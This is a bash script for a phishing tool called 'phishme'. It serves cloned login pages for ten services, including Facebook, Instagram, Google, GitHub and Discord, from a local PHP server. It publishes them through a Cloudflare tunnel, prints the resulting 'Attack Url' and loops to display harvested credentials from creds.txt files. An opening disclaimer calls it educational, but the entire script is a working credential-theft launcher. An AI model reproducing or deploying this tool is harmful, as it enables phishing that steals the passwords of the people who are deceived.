#!/bin/bash

clear

RED="$(printf '\033[31m')"
GREEN="$(printf '\033[32m')"
BLUE="$(printf '\033[34m')"
CYAN="$(printf '\033[36m')"
WHITE="$(printf '\033[37m')"
RESETBG="$(printf '\e[0m\n')"
WHITEBG="$(printf '\033[47m')"

cat << EOF

Message From - [ ${RED}jungawagat${WHITE} ] :

As the creator of this tool [ ${GREEN}phishme${WHITE} ]
I hereby declare that I will not be held responsible for any misuse of this tool
This tool was created solely for educational purposes and as a personal project
The user of this tool assumes all legal responsibilities associated with its use !

EOF

read -p "${CYAN}[**] Do You Accept The Terms ?? [yes] ~> " answer
if [ $answer != "yes" ] ; then
echo "${RED}"
echo "[**] What A Waste Of Internt : Quitting !"
echo ""
exit
fi

cat << EOF

${GREEN}d8888b  db   db d888888b  d8888  db   db  88b  d88  d88888b
${GREEN}88   88 88   88    88    88   YP 88   88 88 YbdP 88 88
${GREEN}88oodD  88ooo88    88     8bo    88ooo88 88  88  88 88ooooo
${GREEN}88      88ooo88    88       Y8b  88ooo88 88  88  88 88ooooo
${GREEN}88      88   88    88    db   8D 88   88 88  88  88 88
${GREEN}88      YP   YP Y888888P  8888Y  YP   YP YP  YP  YP Y88888P

${WHITEBG}${RED}----------- https://github.com/jungawagat/phishme -----------${RESETBG}
EOF

for file in "./cloudflared/*"
do
if ! [[ -x $file ]] ; then
chmod +x $file
fi
done

if [ -f cloudflared.log ] ; then
rm cloudflared.log
fi

machine=$(uname -m)

echo ""
echo "${GREEN}[**] Running On $machine Device !${CYAN}"
echo ""

if [ $machine == "x86_64" ] ; then
cloudflared="cloudflared-amd64"
elif [ $machine == "i686" ] ; then
cloudflared="cloudflared-366"
elif [ $machine == "aarch64" ] ; then
cloudflared="cloudflared-arm64"
elif [ $machine == "armv7l" ] ; then
cloudflared="cloudflared-arm"
else
echo "${RED}[**] Sorry Your Device Is Not Supported !"
echo ""
exit
fi

if ! nc -z google.com 80 > /dev/null 2>&1 ; then
echo "${RED}[**] No Internet Connection !"
exit
fi

echo "[01] ~> Facebook"
echo "[02] ~> Instagram"
echo "[03] ~> Snapchat"
echo "[04] ~> Twitter"
echo "[05] ~> Reddit"
echo "[06] ~> Github"
echo "[07] ~> Stack-Overflow"
echo "[08] ~> Google"
echo "[09] ~> Discord"
echo "[10] ~> Linked-In"
echo "${RED}"

read -p "[**] Enter A Number ~> " number
echo "${WHITE}"

startserver()
{
nohup php -S localhost:8080 -t $1 > /dev/null 2>&1 &
php_pid=$!
while ! nc -z localhost 8080
do
sleep 1
done
echo "${GREEN}[**] PHP Server Started !"
echo ""

nohup ./cloudflared/$cloudflared tunnel -url "localhost":"8080" --logfile cloudflared.log > /dev/null 2>&1 &
cloudflared_pid=$!
while true
do
if [ -f cloudflared.log ] ; then
url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cloudflared.log")
if [ -n "$url" ] ; then
echo "${GREEN}[**] Cloudflared Server Started !"
echo ""
echo "${WHITEBG}${RED}[**] Attack Url : $url${RESETBG}"
break
fi
sleep 1
fi
done
}

trap cleanup INT TERM

cleanup()
{
echo "${RED}"
echo "[**] User Exit : Killing Servers !"
kill $php_pid
kill $cloudflared_pid
exit
}

capturelogin()
{
echo ""
echo "${CYAN}[**] Waiting For Logins !"
while true
do
if [ -f $1 ]; then
echo "${RED}" ; cat $1 ; rm $1
fi
done
}

if [ $number == 01 ];then

startserver "./webpages/facebook/"
capturelogin "./webpages/facebook/creds.txt"

elif [ $number == 02 ]; then

startserver "./webpages/instagram/"
capturelogin "./webpages/instagram/creds.txt"

elif [ $number == 03 ]; then

startserver "./webpages/snapchat/"
capturelogin "./webpages/snapchat/creds.txt"

elif [ $number == 04 ]; then

startserver "./webpages/twitter/"
capturelogin "./webpages/twitter/creds.txt"

elif [ $number == 05 ]; then

startserver "./webpages/reddit/"
capturelogin "./webpages/reddit/creds.txt"

elif [ $number == 06 ]; then

startserver "./webpages/github/"
capturelogin "./webpages/github/creds.txt"

elif [ $number == 07 ]; then

startserver "./webpages/stackoverflow/"
capturelogin "./webpages/stackoverflow/creds.txt"

elif [ $number == 08 ]; then

startserver "./webpages/google/"
capturelogin "./webpages/google/creds.txt"

elif [ $number == 09 ]; then

startserver "./webpages/discord/"
capturelogin "./webpages/discord/creds.txt"

elif [ $number == 10 ]; then

startserver "./webpages/linkedin/"
capturelogin "./webpages/linkedin/creds.txt"

else

echo "${RED}[**] Invalid Input [ $number ] : Quitting !${RESETBG}"
echo ""
exit

fi
